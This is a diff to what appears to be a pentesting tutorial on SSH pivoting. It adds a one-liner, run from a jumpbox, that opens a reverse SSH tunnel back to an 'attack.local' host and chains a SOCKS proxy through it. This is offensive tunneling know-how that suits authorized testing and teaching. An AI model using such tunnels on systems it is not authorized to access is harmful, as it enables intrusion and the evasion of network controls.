@@ -107,6 +107,12 @@ Now, hop back to your attack box and run `ss -tlpn | grep 2222` and you should s
 ```
 ssh -f -N -D 127.0.0.1:8888 <jumpbox1-user>@127.0.0.1 -p 2222
 ````
+Or, if you want a oneliner that can do it all from `jumpbox1.local`
+```
+ssh -f -R 2222:127.0.0.1:22 attack.local ssh -f -N -D 8888 127.0.0.1 -p 2222
+```
+And magic happens...
+
 And from here, you'd do the rest as shown before.
 
 ## Demo round 2
